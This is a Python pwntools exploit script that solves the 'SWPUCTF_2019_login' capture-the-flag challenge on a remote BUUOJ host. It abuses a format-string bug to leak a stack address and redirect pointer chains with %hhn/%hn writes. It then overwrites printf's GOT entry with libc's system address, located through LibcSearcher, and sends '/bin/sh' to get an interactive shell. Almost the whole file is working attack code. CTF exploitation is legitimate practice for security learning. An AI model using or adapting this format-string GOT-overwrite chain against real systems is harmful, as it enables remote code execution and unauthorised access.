from pwn import *

context(log_level='debug')
io=remote("node3.buuoj.cn",26283)
#io=process("./SWPUCTF_2019_login")

elf=ELF("./SWPUCTF_2019_login")

#libc=ELF("/lib/i386-linux-gnu/libc.so.6")


io.recv()

io.sendline(b'test')


#while
io.recv()


  
#libc_start_main
'''
io.sendline(b'%15$p')

io.recvuntil(b'password: ')

libc_start_main=int(io.recvuntil(b'\n',drop=True),16)-245

print(hex(libc_start_main))

from LibcSearcher import *  
#没找到
libc = LibcSearcher('__libc_start_main',libc_start_main)  
#获取libc加载地址  
libc_base = libc_start_main - libc.dump('__libc_start_main')  
#获取system地址  
system = libc_base + libc.dump('system')

#base=libc_start_main-libc.symbols['__libc_start_main']

#system=base+libc.symbols['system']

#bin_sh=base+next(libc.search(b'/bin/sh\x00'))
'''
#get shell
#gdb.attach(io,'b main')
printf_got=0x0804b014


#ebp

#io.recv()
payload='%6$p'
io.sendline(payload)

io.recvuntil(b'password: ')
ebp=int(io.recvuntil(b'\n',drop=True),16)

success('ebp: '+hex(ebp))



#raw_input()
#修改第一条链

io.recv()
got_addr=ebp-4
num = got_addr & 0xFF
payload = '%' + str(num) + 'c%6$hhn'
io.sendline(payload)

io.recv()



num = printf_got & 0xFF
payload = '%' + str(num) + 'c%10$hhn'
io.sendline(payload)

#leak printf

io.recv()

payload=b'%9$s'
io.sendline(payload)

io.recvuntil(b'password: ')
printf=u32(io.recv(4))
print(hex(printf))


from LibcSearcher import *  

libc = LibcSearcher('printf',printf)  
#获取libc加载地址  
libc_base = printf - libc.dump('printf')  
#获取system地址  
system = libc_base + libc.dump('system')

#io.recvuntil(b'password: ')





io.recv()
#raw_input()
got_addr = got_addr - 8
num = got_addr & 0xFF
payload = '%' + str(num) + 'c%6$hhn'
io.sendline(payload)

#raw_input()
io.recv()
num = (printf_got+2) & 0xFFFF
payload = '%' + str(num) + 'c%10$hn'
io.sendline(payload)

#raw_input()
io.recv()
num1 = system&0xFFFF
num2 = (system>>16)-num1
print( hex(num1), ',', hex(num2))


	#f.write(hex(num1))
	#f.write(hex(num2))
payload ='%' + str(num1) + 'c%9$hn%' + str(num2) + 'c%7$hn'

io.sendline(payload)

#raw_input()
io.recv()
payload = "/bin/sh"
io.sendline(payload)

#pause()

io.interactive()